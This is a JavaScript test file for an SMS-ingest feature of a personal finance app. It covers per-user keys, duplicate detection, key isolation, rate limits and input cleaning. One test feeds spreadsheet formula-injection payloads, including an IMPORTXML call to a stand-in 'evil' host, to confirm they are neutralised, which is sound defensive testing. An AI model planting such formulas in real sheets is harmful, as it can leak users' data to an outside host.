// backend/tests/ingest.test.js
//
// Plain-English what this checks: a friend's bank SMS reaching THEIR OWN private space (ingest.js). A friend with the full app can
// get a private key; the SMS reader sends parsed messages with that key; each one lands only in that person's own Transactions
// tab (once, never twice), shows up in their Pending list, and a key can never reach anyone else's space or the owner's Sheet.
// Switching the friend off deletes the key. All data here is invented.
// Run with: node backend/tests/ingest.test.js

const crypto = require("crypto");
const { build, OWNER, FRIEND } = require("./_ownerWorld");
const { assert } = require("./_fakeSheetsKit");

const OTHER = "other@example.com";
const w = build(); const sb = w.sb;
sb.Utilities.DigestAlgorithm = { SHA_256: "SHA_256" };
sb.Utilities.computeDigest = function(alg, text){ return Array.from(crypto.createHash("sha256").update(String(text)).digest()).map(function(b){ return b > 127 ? b - 256 : b; }); };
let uuidN = 0;
sb.Utilities.getUuid = function(){ return crypto.randomUUID(); };
sb.sendPushNotification = function(title, body){ w.pushes.push({ title: title, body: body }); };
w.store["users/" + OWNER + "/friends/" + OTHER] = { fields: { name: "Other", email: OTHER, mirror: false, balancePaise: 0 }, updateTime: "t0" };
sb.verifyGoogleIdToken = (function(orig){ return function(t){ return t === "other" ? { email: OTHER, name: "Other" } : orig(t); }; })(sb.verifyGoogleIdToken);
w.addSheet("Transactions", [["Date", "Time"], ["2026-10-10", "10:00:00"]]);
const ownerSheetBefore = JSON.stringify(w.sheets.Transactions.rows);

const tx = function(over){ return Object.assign({ bank: "HDFC", type: "debit", mode: "upi", amount: 120, reference: "555000111", counterparty: "Cafe Q" }, over || {}); };
const send = function(key, over){ return JSON.parse(sb.handlePwaRequest(Object.assign({ action: "ingestSms", key: key, tx: tx(), sms: "Rs.120 debited to Cafe Q", sender: "HDFCBK", timestamp: 1791863517 }, over || {})).getContent()); };

console.log("\n--- 1. Getting a key ---");
let key;
{
  assert(w.act("friend", { action: "getMyIngestKey" }).ok === false, "a friend who is not switched on gets no key");
  sb.v2dbEnableUser(FRIEND);
  const r = w.act("friend", { action: "getMyIngestKey" });
  assert(r.ok === true && /^[a-f0-9]{64}$/.test(r.key), "a switched-on friend gets a long random key");
  key = r.key;
  assert(w.act("friend", { action: "getMyIngestKey" }).key === key, "asking again returns the same key");
  assert(w.act("owner", { action: "getMyIngestKey" }).ok === false, "the owner never gets one (his SMS goes the existing way)");
  assert(w.act("stranger", { action: "getMyIngestKey" }).ok === false, "a stranger gets nothing");
  const stored = JSON.stringify(w.store);
  assert(stored.indexOf('"key":"' + key + '"') !== -1 && Object.keys(w.store).some(function(p){ return p.indexOf("ingestKeys/") === 0; }), "the key is stored in her own folder, and only a fingerprint in the lookup list");
  assert(!Object.keys(w.store).some(function(p){ return p.indexOf("ingestKeys/") === 0 && p.indexOf(key) !== -1; }), "the lookup list never holds the key itself");
}

console.log("\n--- 2. A message with her key lands in her own space, once ---");
{
  const r = send(key);
  assert(r.ok === true && r.saved === true, "the message was saved");
  const mine = w.virtualTab(FRIEND, "Transactions");
  const row = mine[mine.length - 1];
  assert(row[5] === 120 && row[7] === "Cafe Q" && row[3] === "debit" && row[10] === "Rs.120 debited to Cafe Q", "the row has the amount, merchant, type and the original text");
  assert(w.pushes.some(function(p){ return /120/.test(p.body); }), "she got a notification");
  const again = send(key);
  assert(again.ok === true && again.saved === false && again.duplicate === true, "the same message again is not saved twice");
  const sameRef = send(key, { sms: "a different wording, same bank reference" });
  assert(sameRef.duplicate === true, "the same bank reference is not saved twice either");
  // A message that repeats word for word every month (a SIP debit, no reference): a new one a month later is a NEW transaction, a retry is not
  const sip = { tx: tx({ reference: "", amount: 2000, counterparty: "Mandate Co" }), sms: "INR 2000.00 deducted from A/C towards Mandate Co UMRN: X1" };
  const m1 = send(key, Object.assign({ timestamp: 1791863517 }, sip));
  const m1Retry = send(key, Object.assign({ timestamp: 1791863517 }, sip));
  const m2 = send(key, Object.assign({ timestamp: 1791863517 + 30 * 86400 }, sip));
  assert(m1.saved === true && m1Retry.duplicate === true, "a monthly identical message: the first is saved, a same-day retry is not");
  assert(m2.saved === true, "the same text a month later is saved as a new transaction");
  const second = send(key, { tx: tx({ reference: "555000222", amount: 40 }), sms: "Rs.40 debited to Shop W" });
  assert(second.saved === true && w.virtualTab(FRIEND, "Transactions").length === mine.length + 3, "a different transaction is saved (plus the two monthly messages above)");
  const pend = w.act("friend", { action: "getPending" });
  assert(pend.ok === true && pend.transactions.length === 4, "all show up in HER Pending list (" + pend.transactions.length + ")");
  assert(JSON.stringify(w.sheets.Transactions.rows) === ownerSheetBefore, "the owner's Sheet was not touched");
  assert(w.virtualTab(OWNER, "Transactions") === null || w.virtualTab(OWNER, "Transactions").length <= 1, "the owner's private space was not touched");
}

console.log("\n--- 3. A key reaches only its own person; bad keys do nothing ---");
{
  sb.v2dbEnableUser(OTHER);
  const otherKey = w.act("other", { action: "getMyIngestKey" }).key;
  assert(otherKey && otherKey !== key, "another friend gets a different key");
  const before = w.virtualTab(FRIEND, "Transactions").length;
  send(otherKey, { tx: tx({ reference: "999", amount: 7 }), sms: "Rs.7 debited to X" });
  assert(w.virtualTab(FRIEND, "Transactions").length === before, "the other friend's key did not add anything to hers");
  assert(w.virtualTab(OTHER, "Transactions").length === 2, "it went to the other friend's own space");
  const bad = [send("short"), send("x".repeat(64)), send(""), send(undefined), send(key + "00")];
  assert(bad.every(function(b){ return b.ok === false; }), "wrong, short, empty and altered keys are all refused");
  assert(w.virtualTab(FRIEND, "Transactions").length === before, "and add nothing");
}

console.log("\n--- 4. Odd input is cleaned, not trusted ---");
{
  const r = send(key, { tx: { bank: "B".repeat(500), type: "weird", amount: "abc", reference: "R".repeat(500), counterparty: "C".repeat(900) }, sms: "S".repeat(5000) });
  const row = w.virtualTab(FRIEND, "Transactions").pop();
  assert(r.saved === true && row[3] === "" && row[5] === "" && row[2].length === 40 && row[6].length === 60 && row[7].length === 200 && row[10].length === 2000, "type, amount and lengths are cleaned");
}

console.log("\n--- 5. Switching a friend off deletes the key ---");
{
  const r = w.act("owner", { action: "setFriendFullApp", email: FRIEND, on: false });
  assert(r.ok === true, "the owner switched her off");
  const after = send(key, { tx: tx({ reference: "123123" }), sms: "Rs.1 debited to Z" });
  assert(after.ok === false, "her old key no longer works");
  assert(!Object.keys(w.store).some(function(p){ return p === "users/" + FRIEND + "/ingest/key"; }), "her stored key is gone");
  w.act("owner", { action: "setFriendFullApp", email: FRIEND, on: true });
  const fresh = w.act("friend", { action: "getMyIngestKey" }).key;
  assert(fresh && fresh !== key, "switching her back on gives a NEW key");
}

console.log("\n--- 6. Cheap abuse limits and safe text ---");
{
  const store = {};
  sb.CacheService = { getScriptCache: function(){ return { get: function(k){ return Object.prototype.hasOwnProperty.call(store, k) ? store[k] : null; }, put: function(k, v){ store[k] = String(v); }, remove: function(k){ delete store[k]; } }; } };
  const k2 = w.act("friend", { action: "getMyIngestKey" }).key;
  const reads = [];
  const origGet = sb.fsGetPathMeta_;
  sb.fsGetPathMeta_ = function(p){ reads.push(p); return origGet(p); };
  for(let i = 0; i < 30; i++) send("z".repeat(64));
  const readsAfterBad = reads.length;
  const refused = send(k2, { tx: tx({ reference: "777001" }), sms: "Rs.1 debited to A" });
  assert(refused.ok === false && /too many/i.test(refused.error), "after 30 wrong keys in a minute, even a request is refused");
  assert(reads.length === readsAfterBad, "and it is refused WITHOUT reading the database again");
  sb.fsGetPathMeta_ = origGet;
  delete store.ING_BAD;
  // formulas
  const f = send(k2, { tx: tx({ reference: "777002", counterparty: "=IMPORTXML(\"http://evil\")", bank: "+cmd" }), sms: "@SUM(1) Rs.2 debited" });
  const row = w.virtualTab(FRIEND, "Transactions").pop();
  assert(f.saved === true && row[7].indexOf("'=") === 0 && row[2].indexOf("'+") === 0 && row[10].indexOf("'@") === 0, "text starting with = + - @ is stored with a ' in front, so it can never run as a formula");
  const again = send(k2, { tx: tx({ reference: "777003" }), sms: "@SUM(1) Rs.2 debited" });
  assert(again.duplicate === true, "the duplicate check still works on that cleaned text");
  // per-person cap
  for(let i = 0; i < 120; i++) send(k2, { tx: tx({ reference: "88" + i, amount: 1 }), sms: "Rs.1 debited to Shop " + i });
  const count = w.virtualTab(FRIEND, "Transactions").length;
  const over = send(k2, { tx: tx({ reference: "990001" }), sms: "one more message" });
  assert(over.ok === false && /too many/i.test(over.error), "one person cannot add endless rows (cap per 6 hours)");
}

console.log("\n--- 7. A friend marking a message 'not a transaction' never writes it into the owner's spam list ---");
{
  sb.CacheService = { getScriptCache: function(){ return { get: function(){ return null; }, put: function(){}, remove: function(){} }; } };   // fresh limits
  const k = w.act("friend", { action: "getMyIngestKey" }).key;
  send(k, { tx: tx({ reference: "661001", amount: 3 }), sms: "Your favourite plan will stay available on Vi. Recharge today for more benefits!" , sender: "VG-611112-P" });
  const p = w.act("friend", { action: "getPending" }).transactions.filter(function(t){ return t.amount === 3; })[0];
  const r = w.act("friend", { action: "markNotATransaction", row: p.row, fp: p.fp });
  assert(r.ok === true && r.patternLearned === true, "it is removed from her Pending, and the pattern is learned in HER OWN private junk list");
  assert(JSON.stringify(w.virtualTab(FRIEND, "LearnedSpamPatterns") || []).indexOf("favourite plan") !== -1, "...which holds her message (hers to keep)");
  const spam = w.sheets.LearnedSpamPatterns;
  assert(!spam || spam.rows.length <= 1, "the owner's learned-spam list holds nothing from her");
  assert(JSON.stringify(w.sheets).indexOf("favourite plan") === -1, "her message text is nowhere in the owner's Sheet");
  const ign = w.virtualTab(FRIEND, "Transactions_Ignored");
  assert(ign && JSON.stringify(ign).indexOf("favourite plan") !== -1, "it is archived in HER own space");
}
